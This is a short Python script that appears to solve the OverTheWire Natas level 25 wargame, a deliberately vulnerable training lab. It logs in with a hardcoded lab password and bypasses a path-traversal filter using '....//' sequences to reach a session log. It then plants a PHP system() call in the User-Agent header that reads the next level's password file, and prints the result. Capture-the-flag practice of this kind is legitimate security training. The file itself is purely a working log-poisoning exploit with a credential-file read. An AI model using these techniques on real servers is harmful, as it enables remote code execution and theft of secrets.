import requests
import re

def flag(url,username,password):
    session = requests.Session()
    site = session.get(url,auth=(username,password))
    if site.status_code == 401:
        print("Wrong credentials")
        exit()
    cookie_dict = session.cookies.get_dict()
    cookie_value = cookie_dict['PHPSESSID']
    file = '?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_' + cookie_value + '.log'
    payload = url + file
    user_agent = {
            "User-Agent":"<?php system('cat /etc/natas_webpass/natas26'); ?>"
            }
    rce = session.get(payload,auth=(username,password),headers=user_agent)
    flag = re.findall("](.*)",rce.text)
    print("The flag for natas25 is: " + flag[0].strip())

if __name__=="__main__":
    url = "http://natas25.natas.labs.overthewire.org/"
    username = "natas25"
    password = "O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx"
    flag(url,username,password)